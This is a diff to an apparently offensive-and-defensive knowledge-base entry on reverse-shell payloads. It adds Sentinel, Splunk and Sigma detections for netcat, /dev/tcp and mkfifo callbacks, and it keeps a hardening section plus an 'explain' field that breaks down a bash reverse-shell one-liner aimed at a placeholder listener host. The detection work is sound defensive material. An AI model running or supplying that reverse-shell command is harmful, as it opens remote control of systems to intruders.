@@ -102,7 +102,65 @@
     ],
     "misconfiguration": "Outbound connections from servers are not filtered - any process can initiate a TCP connection to arbitrary external IPs on any port. This enables reverse shell callbacks. Additionally, common shell payloads (nc, bash, python) are available on the target, and PowerShell execution policy is not enforced.",
     "vulnerable_config": "# No egress firewall rules on compromised host:\niptables -L OUTPUT  # policy ACCEPT, no rules\n# nc, bash, python3 all available\n\n# Windows - PowerShell unrestricted:\nGet-ExecutionPolicy  # Unrestricted or Bypass\n# Defender not detecting reverse shell payloads (AV evasion successful)",
-    "secure_config": "# Linux egress filtering:\niptables -P OUTPUT DROP\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A OUTPUT -p tcp --dport 443 -d <known_good_ips> -j ACCEPT\n# Blocks arbitrary reverse shell callbacks\n\n# Windows - PowerShell Constrained Language Mode:\n# GPO: Enable WDAC policy\n# Set execution policy = AllSigned (unsigned scripts blocked)\n\n# Windows Defender AMSI: scans all PS scripts before execution\n# AMSI bypass detection: EDR products detect common AMSI bypass patterns\n\n# Application allowlisting (AppLocker/WDAC):\n# Blocks execution of dropped payloads and LOLBin abuse\n# The most effective defense against arbitrary payload execution"
+    "secure_config": "# Linux egress filtering:\niptables -P OUTPUT DROP\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A OUTPUT -p tcp --dport 443 -d <known_good_ips> -j ACCEPT\n# Blocks arbitrary reverse shell callbacks\n\n# Windows - PowerShell Constrained Language Mode:\n# GPO: Enable WDAC policy\n# Set execution policy = AllSigned (unsigned scripts blocked)\n\n# Windows Defender AMSI: scans all PS scripts before execution\n# AMSI bypass detection: EDR products detect common AMSI bypass patterns\n\n# Application allowlisting (AppLocker/WDAC):\n# Blocks execution of dropped payloads and LOLBin abuse\n# The most effective defense against arbitrary payload execution",
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Reverse Shell Payloads - Sentinel",
+        "logic": "DeviceProcessEvents\n| where ProcessCommandLine has_any (\"/dev/tcp/\",\"-e /bin/\",\"nc -e\",\"ncat -e\",\"mkfifo\")\n| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine\n| union (DeviceNetworkEvents | where InitiatingProcessFileName in~ (\"nc\",\"ncat\",\"bash\",\"sh\",\"python\",\"powershell.exe\") and RemoteIPType == \"Public\" | project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, InitiatingProcessFileName, ProcessCommandLine=strcat(RemoteIP,\":\",tostring(RemotePort)))\n| sort by Timestamp desc\n// reverse shell payloads (bash/python/powershell) calling back to the attacker",
+        "data_source": "powershell",
+        "attack": [
+          "T1059.004"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      },
+      {
+        "platform": "splunk",
+        "name": "Reverse Shell Payloads (1) - Splunk",
+        "logic": "index=sysmon EventCode=1 (ParentImage=\"*bash\" OR ParentImage=\"*sh\" OR ParentImage=\"*cmd.exe\" OR ParentImage=\"*powershell.exe\") (Image=\"*nc*\" OR Image=\"*ncat*\" OR CommandLine=\"*/dev/tcp/*\" OR CommandLine=\"*-e /bin/*\")\n| table _time, Computer, ParentImage, Image, CommandLine",
+        "data_source": "sysmon",
+        "attack": [
+          "T1059.004"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "log_ids": [
+          "1"
+        ]
+      },
+      {
+        "platform": "splunk",
+        "name": "Reverse Shell Payloads (2) - Splunk",
+        "logic": "index=sysmon EventCode=3\n| where match(Image, \"(?i)(nc|ncat|bash|sh|python|powershell)\")\n| table _time, Computer, Image, DestinationIp, DestinationPort",
+        "data_source": "sysmon",
+        "attack": [
+          "T1059.004"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "log_ids": [
+          "3"
+        ]
+      },
+      {
+        "platform": "sigma",
+        "name": "proc_creation_reverse_shell_indicators",
+        "logic": "proc_creation_reverse_shell_indicators",
+        "data_source": "sysmon",
+        "attack": [
+          "T1059.004"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      }
+    ],
+    "visibility": {
+      "requires": [
+        "powershell",
+        "sysmon"
+      ]
+    }
   },
   "explain": "Reverse-shell payload run on the target to call back to your listener:\n  bash -c '...'                 run the one-liner in bash\n  bash -i                       start an interactive shell\n  >& /dev/tcp/<lhost>/<lport>   redirect it over a TCP socket to your host/port\n  0>&1                          wire stdin back through the same socket\nThe victim initiates the outbound connection, which usually gets past egress firewall rules; catch it with a netcat listener."
 }
